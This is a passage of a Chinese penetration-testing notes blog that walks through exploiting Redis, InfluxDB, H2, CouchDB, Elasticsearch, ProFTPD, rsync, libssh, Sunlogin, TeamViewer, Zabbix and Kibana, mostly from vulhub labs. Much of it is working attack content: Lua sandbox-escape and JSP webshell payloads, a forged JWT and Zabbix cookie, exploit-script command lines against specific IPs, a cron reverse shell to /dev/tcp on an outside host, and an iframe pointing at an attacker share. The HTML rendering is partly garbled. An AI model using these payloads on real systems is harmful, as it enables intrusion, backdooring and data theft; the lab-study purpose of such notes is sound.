root@118.31.57.214</span><br><span class="line">（ 4 ）RCE自动化利用脚本</span><br><span class="line">https://github.com/vulhub/redis-rogue-getshell</span><br><span class="line">python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f</span><br><span class="line">RedisModulesSDK/exp.so -c &quot;id&quot;</span><br><span class="line">（ 5 ）沙箱绕过RCE CVE- 2022 - 0543 ：</span><br><span class="line">https://github.com/aodsec/CVE- 2022 - 0543</span><br><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);</span><br><span class="line">local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br><span class="line">* 此漏洞较新，当确认有 redis未授权时，用redis-cli连接进来，可以直接执行系统命令</span><br></pre></td></tr></table></figure>
-<h4 id="314-influxdb通过jwt伪造身份"><a class="markdownIt-Anchor" href="#314-influxdb通过jwt伪造身份">#</a> 3.1.4 influxdb 通过 jwt 伪造身份</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启</span><br><span class="line">了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此</span><br><span class="line">时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</span><br><span class="line"># 漏洞复现地址：https://vulhub.org/#/environments/influxdb/unacc/</span><br><span class="line">环境启动后，访问http://your-ip:8086/debug/vars即可查看一些服务信息，但</span><br><span class="line">此时执行SQL语句则会出现 401 错误：其中，admin是一个已经存在的用户，</span><br><span class="line">exp是一个时间戳，代表着这个token的过期时间，设置为一个未来的时间戳。</span><br><span class="line">借助https://jwt.io/来生成jwt token：</span><br></pre></td></tr></table></figure>
-<ol>
-<li>{</li>
-<li>“alg”: “HS256”,</li>
-<li>“typ”: “JWT”</li>
-<li>}</li>
-<li>{ “username”: “admin”,</li>
-<li>“exp”: 1676346267 }<br>
- 将空密钥生成的 jwt 代入到数据包中进行发送：<br>
-Authorization: Bearer<br>
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhw</li>
-</ol>
-<p>IjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A<br>
-db=sample&amp;q=show+users<br>
- 可以尝试查询一些敏感数据，后期是否能得到更高的系统权限需要看这个<br>
-是否支持，否则的话就是只能读取数据。</p>
-<h4 id="315-h2-database实现jndi注入"><a class="markdownIt-Anchor" href="#315-h2-database实现jndi注入">#</a> 3.1.5 h2 database 实现 jndi 注入</h4>
-<p>H2 database 是一款 Java 内存数据库，多用于单元测试。H2 database 自带一<br>
-个 Web 管理页面，在 Spirng 开发中，如果我们设置如下选项，即可允许外部用<br>
-户访问 Web 管理页面，且没有鉴权。<br>
-spring.h2.console.enabled=true<br>
-spring.h2.console.settings.web-allow-others=true<br>
- 利用这个页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。<br>
-#<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvaDJkYXRhYmFzZS9oMi1jb25zb2xlLXVuYWNjL1JFQURNRS56aC1jbi5tZA==">https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md</span></p>
-<p>启动后，访问 http://your-ip:8080/h2-console / 即可查看到 H2 database 的管理<br>
-页面。可以借助这个小工具 https://github.com/JosephTribbianni/JNDI 简化我们的<br>
-复现过程。<br>
-首先设置 JNDI 工具中执行的命令为 touch /tmp/success, 然后启动 JNDI-1.0-<br>
-all.jar，在 h2 console 页面填入 JNDI 类名和 URL 地址：其中，javax.naming.<br>
-InitialContext 是 JNDI 的工厂类，URL rmi://evil:23456/BypassByEL 是运行 JNDI<br>
- 工具监听的 RMI 地址。点击连接后，恶意 RMI 成功接收到请求：touch<br>
-/tmp/success 已成功执行。</p>
-<h4 id="316-couchdb纵向权限漏洞"><a class="markdownIt-Anchor" href="#316-couchdb纵向权限漏洞">#</a> 3.1.6 Couchdb 纵向权限漏洞</h4>
-<p>Apache CouchDB，使用语言用于一个性并成为 “一个完全方便 web 的数据<br>
-库”。它是一个使用 JSON 作为存储格式，JavaScript 查询，MapReduce 和<br>
- HTTPBBC 作为 API 的 NoSQL 数据库。它应用很广泛，如用在其动态展示平台，<br>
-Credit Suisse 用在其商品的市场框架，Meebo，用在其内部社交内容平台（网络<br>
-和应用程序）。<br>
-在 2017 年 11 月 15 日，CVE- 2017 - 12635 和 CVE- 2017 - 12636 ，CVE-<br>
-2017 - 12635 可能是由于 Erlang 和 JavaScript 对 JSON 解析方式的不同，导致<br>
-语句执行产生差异性导致的。让任意权限管理员，属于不同权限的用户创建权<br>
-限。影响版本： &lt; 1.7.0 以及 &lt; 2.1.1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/vulhub/vulhub/blob/master/couchdb/CVE- 2017 - 12635/README.zh-cn.md</span><br></pre></td></tr></table></figure>
-<ol start="7">
-<li>
-<h1 id="发送包含两个约束的数据包"><a class="markdownIt-Anchor" href="#发送包含两个约束的数据包">#</a> 发送包含两个约束的数据包：</h1>
-</li>
-<li>PUT /_users/org.couchdb.user:vulhub HTTP/1.1</li>
-<li>{</li>
-<li>“type”: “user”,</li>
-<li>“name”: “vulhub”,</li>
-<li>“roles”: [&quot;_admin&quot;],</li>
-<li>“roles”: [],</li>
-<li>“password”: “vulhub”</li>
-<li>}<br>
- 成功创建管理员，密码密码 vulhub，再次访问 http://your-ip:5984/_utils/，输<br>
-入账户密码 vulhub，可以成功登录。
-<h1 id="couchdb-任意命令执行漏洞的复现地址直接用脚本完成就可以"><a class="markdownIt-Anchor" href="#couchdb-任意命令执行漏洞的复现地址直接用脚本完成就可以">#</a> Couchdb 任意命令执行漏洞的复现地址（直接用脚本完成就可以）：</h1>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUt">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-</span> 2017 - 12636/README.zh-cn.md</li>
-</ol>
-<h4 id="317-elasticsearch写入webshell"><a class="markdownIt-Anchor" href="#317-elasticsearch写入webshell">#</a> 3.1.7 Elasticsearch 写入 webshell</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备</span><br><span class="line">份到该路径下，且文件名和后缀都可控。所以，如果同文件系统下还跑着其他</span><br><span class="line">服务，如Tomcat、PHP等，可以利用ElasticSearch的备份功能写入一个webshell。</span><br><span class="line"># https://vulhub.org/#/environments/elasticsearch/WooYun- 2015 - 110216/</span><br></pre></td></tr></table></figure>
-<ol start="16">
-<li>
-<h1 id="首先创建一个恶意索引文档"><a class="markdownIt-Anchor" href="#首先创建一个恶意索引文档">#</a> 首先创建一个恶意索引文档：</h1>
-</li>
-<li>curl - XPOST <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo5MjAwL3l6LmpzcC95ei5qc3AvMQ==">http://127.0.0.1:9200/yz.jsp/yz.jsp/1</span> - d’</li>
-<li>{&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte<span></span>{47,1<br>
-16,101,115,116,46,106,115,112})),new String(new byte<span 114,119></span>)).write(request.get<br>
-Parameter(new String(new byte<span 102></span>)).getBytes());%&gt;&quot;:“test”}</li>
-<li>’</li>
-<li>
-<h1 id="再创建一个恶意的存储库其中location的值即为我要写入的路径"><a class="markdownIt-Anchor" href="#再创建一个恶意的存储库其中location的值即为我要写入的路径">#</a> 再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。</h1>
-</li>
-<li>curl - XPUT ‘<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo5MjAwL19zbmFwc2hvdC95ei5qc3A=">http://127.0.0.1:9200/_snapshot/yz.jsp</span>’ - d '{</li>
-<li>“type”: “fs”,</li>
-<li>“settings”: {</li>
-<li>“location”: “/usr/local/tomcat/webapps/wwwroot/”,</li>
-<li>“compress”: false</li>
-<li>}</li>
-<li>}’</li>
-<li></li>
-<li>
-<h1 id="存储库验证并创建"><a class="markdownIt-Anchor" href="#存储库验证并创建">#</a> 存储库验证并创建:</h1>
-</li>
-<li>curl - XPUT “<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo5MjAwL19zbmFwc2hvdC95ei5qc3AveXouanNw">http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp</span>” - d '{</li>
-<li>“indices”: “yz.jsp”,</li>
-<li>“ignore_unavailable”: “true”,</li>
-<li>“include_global_state”: false</li>
-<li>}’</li>
-</ol>
-<p>访问 http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们<br>
-写入的 webshell。该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符<br>
-串，如：<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgwL3d3d3Jvb3QvaW5kaWNlcy95ei5qc3Avc25hcHNob3QteXouanNwP2Y9c3VjY2VzcyVFRiVCQyU4Qw==">http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，</span><br>
-我们再访问 /wwwroot/test.jsp 就能看到 success 了。</p>
-<h1 id="其他elasticsearch-漏洞httpsvulhuborgenvironmentselasticsearch"><a class="markdownIt-Anchor" href="#其他elasticsearch-漏洞httpsvulhuborgenvironmentselasticsearch">#</a> 其他 elasticSearch 漏洞：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2g=">https://vulhub.org/#/environments/elasticsearch</span></h1>
-<h3 id="32-应用协议"><a class="markdownIt-Anchor" href="#32-应用协议">#</a> 3.2 应用协议</h3>
-<h4 id="321-ftp匿名登录及proftepd漏洞"><a class="markdownIt-Anchor" href="#321-ftp匿名登录及proftepd漏洞">#</a> 3.2.1 ftp 匿名登录及 proftepd 漏洞</h4>
-<h5 id="1-ftp的匿名登录一般有三种"><a class="markdownIt-Anchor" href="#1-ftp的匿名登录一般有三种">#</a> （ 1 ）FTP 的匿名登录一般有三种</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：anonymous 密码：Email或者为空</span><br><span class="line">用户名：FTP 密码：FTP或者为空</span><br><span class="line">用户名：USER 密码：pass</span><br></pre></td></tr></table></figure>
-<ul>
-<li>此外 ftp 还可以用 hydra 进行爆破，知道账户 / 密码时候爆破效率更好</li>
-</ul>
-<p>（ 2 ）Proftpd 协议漏洞：</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Qwa3gvZXhwbG9pdC1DVkUt">https://github.com/t0kx/exploit-CVE-</span> 2015 - 3306<br>
-python <span class="exturl" data-url="aHR0cDovL2V4cGxvaXQucHk=">exploit.py</span> --host 123.58.236.76 --port 24967 --path “/var/www/html/”<br>
-<span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6MTk3NTgvYmFja2Rvb3IucGhwP2NtZD1pZA==">http://123.58.236.76:19758/backdoor.php?cmd=id</span></p>
-<h1 id="遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证"><a class="markdownIt-Anchor" href="#遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证">#</a> 遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证</h1>
-<h4 id="322-rsync备份未授权及rce"><a class="markdownIt-Anchor" href="#322-rsync备份未授权及rce">#</a> 3.2.2 rsync 备份未授权及 RCE</h4>
-<p>rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远<br>
-程文件传输。其中 rsync 协议默认监听 873 端口，如果目标开启了 rsync 服务，<br>
-并且没有配置 ACL 或访问密码，我们将可以读写目标服务器文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">判断：rsync rsync://123.58.236.76:45854/</span><br><span class="line">读取文件：rsync rsync://123.58.236.76:45854/src/</span><br><span class="line">下载文件：rsync rsync://123.58.236.76:45854/src/etc/passwd ./</span><br><span class="line">上传文件：rsync -av passwd rsync://123.58.236.76:45854/src/tmp/passwd</span><br><span class="line">获取信息：rsync rsync://123.58.236.76:12177/src/etc/crontab /root/cron.txt</span><br><span class="line">写入反弹shell的代码：echo - e &quot;#! /bin/bash\nbash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444</span><br><span class="line">0&gt;&amp;1&#x27;&quot; &gt; /tmp/shell.sh ; chmod +x shell</span><br><span class="line">上传文件:rsync -av shell rsync://123.58.236.76:12177/src/etc/cron.hourly</span><br><span class="line">监听端口等待接受反弹: nc - lvvp 4444</span><br></pre></td></tr></table></figure>
-<h1 id="待解决linux计划任务是怎么工作的etccrontab与etccronhourly的关系"><a class="markdownIt-Anchor" href="#待解决linux计划任务是怎么工作的etccrontab与etccronhourly的关系">#</a> 待解决：linux 计划任务是怎么工作的？/etc/crontab 与 /etc/cron.hourly 的关系</h1>
-<p>| msf 和 fofaviewer 批量测试</p>
-<h1 id="httpsgithubcomwgpsecfofa_viewer"><a class="markdownIt-Anchor" href="#httpsgithubcomwgpsecfofa_viewer">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9mb2ZhX3ZpZXdlcg==">https://github.com/wgpsec/fofa_viewer</span></h1>
-<p>msfconsole<br>
-use auxiliary/scanner/rsync/modules_list<br>
-set rhosts file:/root/ips.txt<br>
-set threads 10<br>
-run</p>
-<h4 id="323-ssh用户名枚举及libssh权限认证绕过"><a class="markdownIt-Anchor" href="#323-ssh用户名枚举及libssh权限认证绕过">#</a> 3.2.3 ssh 用户名枚举及 libssh 权限认证绕过</h4>
-<h5 id="1-ssh协议漏洞"><a class="markdownIt-Anchor" href="#1-ssh协议漏洞">#</a> （ 1 ）SSH 协议漏洞：</h5>
-<h5 id="cve-2014-0160-版本很少都被修复了cve_2020_15778-价值不高"><a class="markdownIt-Anchor" href="#cve-2014-0160-版本很少都被修复了cve_2020_15778-价值不高">#</a> CVE- 2014 - 0160 版本很少，都被修复了；CVE_2020_15778 价值不高</h5>
-<p>OpenSSH 8.3p1 及之前版本中的 scp 的 scp.c 文件存在操作系统命令注入漏<br>
-洞。该漏洞即使在禁用 ssh 登录的情况下，但是允许使用 scp 传文件，而且远程<br>
-服务器允许使用反引号 (`)，可利用 scp 复制文件到远程服务器时，执行带有<br>
- payload 的 scp 命令，从而在后续利用中 getshell。需要漏洞版本 &lt;= openssh-8.3p1，<br>
-作用是通过 scp 来连接已知用户名密码的系统。</p>
-<p>CVE- 2018 - 15473 - 用户名枚举<br>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JoeW5vcmF0ZXIvQ1ZFLQ=="> https://github.com/Rhynorater/CVE-</span> 2018 - 15473 - Exploit<br>
-pip3 install -r requirements.txt<br>
-pip3 install paramiko==2.4.1<br>
-python <span class="exturl" data-url="aHR0cDovL3NzaFVzZXJuYW1lRW51bS5weQ==">sshUsernameEnum.py</span> --port 32013 --userList exampleInput.txt 123.58.236.76<br>
- 作用是通过字典来判断对方 ssh 有没有与这个字典里匹配的用户名。</p>
-<p>（ 2 ）libssh 服务端权限认证绕过漏洞（CVE- 2018 - 10933 ）</p>
-<p>libssh 是一个提供 ssh 相关接口的开源库，包含服务端、客户端等。其服务<br>
-端代码中存在一处逻辑错误，攻击者可以在认证成功前发送 MSG_USERAUTH<br>
-_SUCCESS 消息，绕过认证过程，未授权访问目标 SSH 服务器。<br>
-环境启动后，我们可以连接 your-ip:2222 端口（账号密码：<br>
-myuser:mypassword）， 这 是 一 个 合 法 的 ssh 流程。参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy8=">https://www.seebug.org/</span><br>
-vuldb/ssvid- 97614 中给出的 POC，使用 python3 执行，即可在目标服务器上 RCE。</p>
-<h1 id="httpsgithubcomvulhubvulhubblobmasterlibsshcve-"><a class="markdownIt-Anchor" href="#httpsgithubcomvulhubvulhubblobmasterlibsshcve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvbGlic3NoL0NWRS0=">https://github.com/vulhub/vulhub/blob/master/libssh/CVE-</span> 2018 - 10933/README.zh-cn.md</h1>
-<p>| 利用即用即付服务器快速搭建 ss 通道<br>
-在安全组中开放相应端口：<br>
-<span class="exturl" data-url="aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL3ZwYy9zZWN1cml0eWdyb3VwL2RldGFpbC9zZy1tNXJzZTM4eD9yaWQ9NQ==">https://console.cloud.tencent.com/vpc/securitygroup/detail/sg-m5rse38x?rid=5</span></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">教程一：https://www.bwgss.org/154.html</span><br><span class="line">下载并安装：</span><br><span class="line">bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class="line">查看运行状态：</span><br><span class="line">bash &lt;(curl - sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class="line">info</span><br><span class="line">SS卸载：</span><br><span class="line">bash&lt;(curl - sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class="line">uninstall</span><br><span class="line">SS 管理命令：</span><br><span class="line">启动：systemctl start shadowsocks-libev</span><br><span class="line">停止：systemctl stop shadowsocks-libev</span><br><span class="line">重启：systemctl restart shadowsocks-libev</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">教程二：https://www.tangyuecan.com/2019/09/20/%E4%B8%80%E5%88%86%E9%92%9</span><br><span class="line">F%E5%9C %A8centos%E4%B8%8A%E6%90%AD%E5%BB%BAss%E6%9C%8D%E5%8</span><br><span class="line">A%A1%E5%99%A8/</span><br><span class="line">一键安装 shadowsocks-go 版：</span><br><span class="line">wget –no-check-certificate https://tangyuecan.com/shadowsocks-go.sh</span><br><span class="line">chmod +x shadowsocks-go.sh</span><br><span class="line">./shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log</span><br><span class="line">卸载：./shadowsocks.sh uninstall</span><br><span class="line">重启：/etc/init.d/shadowsocks restart</span><br><span class="line">查看配置：/etc/shadowsocks/config.json</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">客户端下载地址：</span><br><span class="line">windows：https://github.com/shadowsocks/shadowsocks-windows/releases</span><br><span class="line">macos：https://github.com/shadowsocks/ShadowsocksX-NG/releases</span><br><span class="line">检验：curl --proxy 127.0.0.1:1087 &quot;http://httpbin.org/ip&quot;</span><br></pre></td></tr></table></figure>
-<p>| linux 下 nginx 服务器域名指定目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将新买的域名解析到指定服务器ip：通过云服务后台操作（1.5h）</span><br><span class="line">域名绑定目录的配置文件都放到这里：/usr/local/nginx/conf/vhost/</span><br><span class="line">在改目录下，新建一个文件，命名：域名.conf； 如：www.baidu.com.conf</span><br><span class="line">指定网站目录：如/data/wwwroot/www.nmap.asia</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重启nginx：systemctl restart nginx</span><br><span class="line"># 将nginx关闭之后，在服务器上随便开启的网站都会被解析到此域名</span><br></pre></td></tr></table></figure>
-<h4 id="324-向日葵rce-vnc口令"><a class="markdownIt-Anchor" href="#324-向日葵rce-vnc口令">#</a> 3.2.4 向日葵 RCE、vnc 口令</h4>
-<h5 id="1-向日葵-rce"><a class="markdownIt-Anchor" href="#1-向日葵-rce">#</a> （ 1 ）向日葵 RCE：</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/Mr-xn/sunlogin_rce</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c &quot;ipconfig&quot;</span><br><span class="line">* 扫描到端口后，针对特定版本进行命令执行操作，可直接反弹shell；可利用nc或者</span><br><span class="line">powershell或者其他目标上存在的程序进行反弹shell</span><br><span class="line">（ 2 ）VNC 口令问题：</span><br><span class="line">可能未设置密码导致的未授权访问</span><br><span class="line">也可以通过msf猜解密码爆破vnc</span><br></pre></td></tr></table></figure>
-<h4 id="325-teamviewer配合xss攻击"><a class="markdownIt-Anchor" href="#325-teamviewer配合xss攻击">#</a> 3.2.5 teamviewer 配合 xss 攻击</h4>
-<h5 id="通过网页调用除了命令执行可以执行任意命令配合xss或者钓鱼使用"><a class="markdownIt-Anchor" href="#通过网页调用除了命令执行可以执行任意命令配合xss或者钓鱼使用">#</a> 通过网页调用除了命令执行，可以执行任意命令，配合 XSS 或者钓鱼使用，</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当发现对方是特定版本的teamviewer时，诱使对方访问构造好的url链接。</span><br></pre></td></tr></table></figure>
-<ol>
-<li>
-<!DOCTYPE html **>**
-</li>
-<li><strong><html></html></strong></li>
-<li><strong><head></head></strong></li>
-<li><strong><title></title></strong> cve- 2020 - 13699 <strong></strong></li>
-<li><strong></strong></li>
-<li><strong><body></body></strong></li>
-<li><strong><p></p></strong> Welcome to xiaodi! <strong><p></p></strong></li>
-<li><strong>&lt;iframe</strong> style=“height:1px;width:1px;” src=‘teamviewer10: --play \attacker-<br>
-IP\share\fake.tvs’ <strong>&gt;</strong></li>
-<li><strong></strong></li>
-<li><strong></strong></li>
-</ol>
-<h4 id="326-zabbix未授权及后台rce"><a class="markdownIt-Anchor" href="#326-zabbix未授权及后台rce">#</a> 3.2.6 zabbix 未授权及后台 rce</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于</span><br><span class="line">Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组</span><br><span class="line">成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口： 10051 。</span><br><span class="line">漏洞复现fofa关键字：app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击脚本：https://github.com/L0ading-x/cve- 2022 - 23131</span><br><span class="line">python3 cve- 2022 - 23131.py http://127.0.0.1 Admin</span><br><span class="line">将生成的zbx_signed_session替换到当前目标的cookie中，点击登陆页面的</span><br><span class="line">sign in with Single Sign-On (SAML)方式登陆，即可直接进入管理界面！</span><br></pre></td></tr></table></figure>
-<h5 id="手动复现"><a class="markdownIt-Anchor" href="#手动复现">#</a> # 手动复现：</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">捕获的原来的cookie的值如下：</span><br><span class="line">zbx_session=eyJzZXNzaW9uaWQiOiJlNWNjNjc2ZWUzNDRlNGU4ZWIzNxxxxsIxxxxxxxx</span><br><span class="line">xMa1lYYXBucWp0RXpMdTFmTVJPcTArOGtxbkFLemdIMTdxUlY1VnErSkpKUGVaZHE3</span><br><span class="line">WG02aGtQd1wvWUxycDgrYXgzbEQ4RjF6ajlRVENHelE9PSJ9</span><br><span class="line">进行base 64 解码后的结果为：</span><br><span class="line">&#123;&quot;sessionid&quot;:&quot;e5cc676ee3xxe8eb3790b521&quot;,&quot;sign&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMROq0+8kqn</span><br><span class="line">AKzgH17qRV5Vxxx7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class="line">添加Admin用户到cookie中：</span><br><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&#123;&quot;sessionid&quot;:&quot;e5cc6xxxx4e4e8eb3790b521&quot;,&quot;si</span><br><span class="line">gn&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMRxxxZdq7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class="line">再次编码后伪造cookie发送：</span><br><span class="line">eyJzYW1sX2RhdGEiOnsidxxxxjoiQWRtaW4ifSx7InNlc3Npb25pZCI6ImU1Y2M2NzZlZTM</span><br><span class="line">0MDQ4NDM2NGU0ZThlYjM3OTBiNTIxIiwic2lnbiI6IjlGdjd5SkxrWVhhcG5xanRFekx1M</span><br><span class="line">WZNUk9xMCs4a3FuQUt6Z0gxN3FSVjVWcStKSkpQZVpkcTdYbTZoa1B3XC9ZTHJwOCt</span><br><span class="line">heDNsRDhGMXpqOVFUQ0d6UT09In0=</span><br><span class="line"># zabbix可以写入一些script脚本并且执行此脚本的操作的，从后台的未授权直接突破到服</span><br><span class="line">务器的权限，再根据服务器的漏洞进行提权</span><br></pre></td></tr></table></figure>
-<h4 id="327-kibana任意代码执行漏洞"><a class="markdownIt-Anchor" href="#327-kibana任意代码执行漏洞">#</a> 3.2.7 Kibana 任意代码执行漏洞</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前</span><br><span class="line">的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代</span><br><span class="line">码。默认端口： 5601</span><br><span class="line">攻击脚本：https://github.com/LandGrey/CVE- 2019 - 7609</span><br><span class="line">原型链污染发生在“Timeline”页面，我们填入如下Payload：</span><br></pre></td></tr></table></figure>
-<ol>
-<li>.es(*).props(label.<strong>proto</strong>.env.AAAA=‘require(“child_process”).exec(&quot;/bin/touch /t<br>
-mp/success&quot;);process.exit()//’)</li>
-<li>.props(label.<strong>proto</strong>.env.NODE_OPTIONS=’–require /proc/self/environ’)<br>
- 成功后再访问 “Canvas” 页面触发命令 /bin/touch/tmp/success，文件成功创建
-<h1 id="httpsgithubcomvulhubvulhubblobmasterkibanacve-"><a class="markdownIt-Anchor" href="#httpsgithubcomvulhubvulhubblobmasterkibanacve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIva2liYW5hL0NWRS0=">https://github.com/vulhub/vulhub/blob/master/kibana/CVE-</span> 2019 - 7609/README.zh-cn.md</h1>
-#可以配合 py 脚本和 Fofaviewer 批量搜索目标测试漏洞：</li>
-</ol>
-<h3 id="33-中间件安全"><a class="markdownIt-Anchor" href="#33-中间件安全">#</a> 3.3 中间件安全</h3>
-<h4 id="331-nginx文件解析漏洞"><a class="markdownIt-Anchor" href="#331-nginx文件解析漏洞">#</a> 3.3.1 nginx 文件解析漏洞</h4>
